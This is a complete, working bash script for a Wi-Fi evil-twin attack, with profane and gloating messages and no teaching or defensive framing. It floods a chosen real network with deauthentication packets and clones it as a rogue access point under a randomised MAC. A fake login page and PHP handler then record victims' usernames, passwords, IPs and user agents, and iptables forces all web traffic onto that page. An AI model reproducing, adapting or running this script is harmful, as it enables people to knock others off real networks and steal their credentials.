#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
DEAUTH_PID=""
DNSMASQ_PID=""
WEB_PID=""
LOG_PID=""
AIRODUMP_PID=""
cleanup() {
    echo -e "\n${YELLOW}[*] Cleaning up this beautiful mess...${NC}"
    [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
    [ -n "$DNSMASQ_PID" ] && kill $DNSMASQ_PID 2>/dev/null
    [ -n "$WEB_PID" ] && kill $WEB_PID 2>/dev/null
    [ -n "$LOG_PID" ] && kill $LOG_PID 2>/dev/null
    [ -n "$AIRODUMP_PID" ] && kill $AIRODUMP_PID 2>/dev/null
    airmon-ng stop wlan0mon 2>/dev/null
    airmon-ng stop wlan0 2>/dev/null
    systemctl start NetworkManager 2>/dev/null || service network-manager start 2>/dev/null
    rm -f /tmp/hostapd.conf /tmp/dnsmasq.conf /tmp/scan-01.csv /tmp/scan-01.kismet.csv 2>/dev/null
    echo -e "${RED}[*] Attack stopped. Go fuck up another network!${NC}"
    exit 0
}
trap cleanup INT TERM EXIT
enable_monitor_mode(){
    iface="$1"
    echo -e "${GREEN}[*] Checking interface ${iface}...${NC}"
    if ! iwconfig 2>/dev/null | grep -q "$iface"; then
        echo -e "${RED}[!] Interface ${iface} not found, you dumbass!${NC}"
        echo -e "${YELLOW}[*] Available interfaces:${NC}"
        iwconfig 2>/dev/null | grep -E "^[[:alnum:]]+" | awk '{print $1}'
        exit 1
    fi
    mode=$(iwconfig "$iface" 2>/dev/null | grep -o "Mode:[A-Za-z]*" | cut -d: -f2)
    if [ "$mode" = "Monitor" ]; then
        echo -e "${GREEN}[✓] Interface $iface is already in Monitor mode${NC}"
        MON_IFACE="$iface"
    else
        echo -e "${YELLOW}[*] Enabling Monitor mode on $iface...${NC}"
        airmon-ng check kill > /dev/null 2>&1
        airmon-ng start "$iface" > /dev/null 2>&1
        MON_IFACE="${iface}mon"
        if ! iwconfig 2>/dev/null | grep -q "$MON_IFACE"; then
            MON_IFACE="$iface"
        fi
        sleep 2
        echo -e "${GREEN}[✓] Monitor mode enabled on ${MON_IFACE}${NC}"
    fi
}
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Run this shit as root, you fucking peasant!${NC}"
        exit 1
    fi
}
scan_networks() {
    echo -e "${GREEN}[*] Scanning for vulnerable networks...${NC}"
    local mon_iface="${1:-wlan0mon}"
    airodump-ng "$mon_iface" --output-format csv -w /tmp/scan > /dev/null 2>&1 &
    AIRODUMP_PID=$!
    echo -e "${YELLOW}[*] Scanning for 15 seconds...${NC}"
    sleep 15
    kill $AIRODUMP_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    echo -e "\n${GREEN}[*] Available networks (BSSID - ESSID):${NC}"
    echo "=========================================="
    if [ -f "/tmp/scan-01.csv" ]; then
        tail -n +2 /tmp/scan-01.csv | grep -E '^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | \
        awk -F',' '{printf "%-20s - %s\n", $1, $14}' | sort | uniq | head -20
    else
        echo -e "${RED}[!] No networks found or scan failed!${NC}"
        echo -e "${YELLOW}[*] Try moving closer to targets, dumbass!${NC}"
        exit 1
    fi
    echo "=========================================="
}
deauth_network() {
    local target_bssid="$1"
    local mon_iface="${2:-wlan0mon}"
    echo -e "${GREEN}[*] Launching deauthentication attack on ${target_bssid}...${NC}"
    echo -e "${YELLOW}[*] This will disconnect all clients from the real network${NC}"
    aireplay-ng --deauth 0 -a "$target_bssid" "$mon_iface" > /dev/null 2>&1 &
    DEAUTH_PID=$!
    sleep 3
    echo -e "${GREEN}[✓] Deauth attack running (PID: $DEAUTH_PID)${NC}"
}
create_evil_twin() {
    local essid="$1"
    local channel="${2:-6}"
    local iface="wlan0"
    echo -e "${GREEN}[*] Creating evil twin: ${essid}...${NC}"
    airmon-ng stop wlan0mon > /dev/null 2>&1
    sleep 2
    ifconfig "$iface" down
    macchanger -r "$iface" > /dev/null 2>&1
    ifconfig "$iface" up
    sleep 2
    cat > /tmp/hostapd.conf << EOF
interface=$iface
driver=nl80211
ssid=$essid
channel=$channel
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=FreePublicWifi
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF
    cat > /tmp/dnsmasq.conf << EOF
interface=$iface
dhcp-range=10.0.0.10,10.0.0.100,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-facility=/var/log/dnsmasq.log
log-queries
log-dhcp
EOF
    echo 1 > /proc/sys/net/ipv4/ip_forward
    > /var/log/dnsmasq.log 2>/dev/null
    touch /var/log/dnsmasq.log
    hostapd /tmp/hostapd.conf -B > /dev/null 2>&1
    sleep 2
    ifconfig "$iface" 10.0.0.1 netmask 255.255.255.0
    dnsmasq -C /tmp/dnsmasq.conf -d > /dev/null 2>&1 &
    DNSMASQ_PID=$!
    sleep 2
    echo -e "${GREEN}[✓] Evil twin ${essid} is live on channel ${channel}${NC}"
}
page_mode() {
    echo -e "${GREEN}[*] Starting credential harvesting page...${NC}"
    mkdir -p /var/www/html
    cat > /var/www/html/index.html << EOF
<!DOCTYPE html>
<html>
<head>
    <title>WiFi Login Required</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .login-box { width: 300px; padding: 20px; border: 1px solid #ccc; margin: 0 auto; }
        input { width: 100%; padding: 8px; margin: 5px 0; }
        button { background: #007bff; color: white; padding: 10px; border: none; width: 100%; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Network Authentication</h2>
        <p>Please login to access the internet</p>
        <form action="/login.php" method="POST">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Login</button>
        </form>
        <p style="font-size: 12px; color: #666;">By logging in, you agree to our terms of service.</p>
    </div>
</body>
</html>
EOF
    cat > /var/www/html/login.php << 'EOF'
<?php
$log_file = '/tmp/stolen_creds.txt';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time = date('Y-m-d H:i:s');
if (!empty($username) && !empty($password)) {
    $log_entry = "[$time] VICTIM CREDENTIALS CAPTURED!\n";
    $log_entry .= "IP: $ip\n";
    $log_entry .= "User Agent: $user_agent\n";
    $log_entry .= "Username: $username\n";
    $log_entry .= "Password: $password\n";
    $log_entry .= "----------------------------------------\n";
    file_put_contents($log_file, $log_entry, FILE_APPEND);
    system('echo "[+] Credentials captured from ' . $ip . '" >> /tmp/attack.log');
}
header('Location: https://www.google.com');
exit;
?>
EOF
    cd /var/www/html
    php -S 10.0.0.1:80 > /dev/null 2>&1 &
    WEB_PID=$!
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
    iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
    echo -e "${GREEN}[✓] Credential harvesting active on http://10.0.0.1${NC}"
    echo -e "${YELLOW}[*] All HTTP/HTTPS traffic redirected to fake login${NC}"
}
password_mode() {
    echo -e "${GREEN}[*] Waiting for victims to connect...${NC}"
    echo -e "${YELLOW}[*] Captured data will be saved to /tmp/wifi_passwords.txt${NC}"
    tail -f /var/log/dnsmasq.log 2>/dev/null | while read line; do
        if echo "$line" | grep -q "DHCPACK"; then
            client_ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
            client_mac=$(echo "$line" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')
            hostname=$(echo "$line" | grep -oE 'hostname [^ ]+' | cut -d' ' -f2 || echo "Unknown")
            timestamp=$(date '+%Y-%m-%d %H:%M:%S')
            echo "[$timestamp] NEW VICTIM CONNECTED!" >> /tmp/wifi_passwords.txt
            echo "IP: $client_ip" >> /tmp/wifi_passwords.txt
            echo "MAC: $client_mac" >> /tmp/wifi_passwords.txt
            echo "Hostname: $hostname" >> /tmp/wifi_passwords.txt
            echo "---" >> /tmp/wifi_passwords.txt
            echo -e "${GREEN}[+] Victim connected: $client_mac ($hostname)${NC}"
        fi
    done &
    LOG_PID=$!
}
clear
check_root
echo -e "${YELLOW}[*] Available wireless interfaces:${NC}"
iwconfig 2>/dev/null | grep -E "^[[:alnum:]]+" | awk '{print $1}' | while read iface; do
    echo "  - $iface"
done
read -p "Enter interface name (default: wlan0): " interface_name
interface_name=${interface_name:-wlan0}
enable_monitor_mode "$interface_name"
MON_IFACE="${interface_name}mon"
scan_networks "$MON_IFACE"
read -p "Enter target network name (ESSID): " TARGET_ESSID
read -p "Enter target BSSID (MAC address): " TARGET_BSSID
read -p "Enter target channel (default: 6): " TARGET_CHANNEL
TARGET_CHANNEL=${TARGET_CHANNEL:-6}
echo -e "\n${GREEN}[1] Page Mode (Credential Harvesting)${NC}"
echo -e "${GREEN}[2] Password Mode (Monitor Connections)${NC}"
read -p "Select attack mode: " MODE
echo -e "\n${RED}[*] INITIATING ATTACK SEQUENCE...${NC}"
deauth_network "$TARGET_BSSID" "$MON_IFACE"
create_evil_twin "$TARGET_ESSID" "$TARGET_CHANNEL"
case $MODE in
    1)
        page_mode
        echo -e "${GREEN}[*] Credential harvesting active!${NC}"
        echo -e "${YELLOW}[*] Check /tmp/stolen_creds.txt for captured credentials${NC}"
        ;;
    2)
        password_mode
        echo -e "${GREEN}[*] Password capture active!${NC}"
        echo -e "${YELLOW}[*] Check /tmp/wifi_passwords.txt for victim data${NC}"
        ;;
    *)
        echo -e "${RED}[!] Invalid mode, defaulting to Page Mode${NC}"
        page_mode
        ;;
esac
echo -e "\n${RED}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}[✓] EVIL TWIN ATTACK DEPLOYED SUCCESSFULLY!${NC}"
echo -e "${YELLOW}[*] Fake network: ${TARGET_ESSID}${NC}"
echo -e "${YELLOW}[*] Real network being deauthenticated${NC}"
echo -e "${YELLOW}[*] Victims will connect to YOUR fake network${NC}"
echo -e "${RED}[!] Press Ctrl+C to stop this beautiful madness${NC}"
echo -e "${RED}════════════════════════════════════════════════════════════${NC}"
while true; do
    sleep 3600
done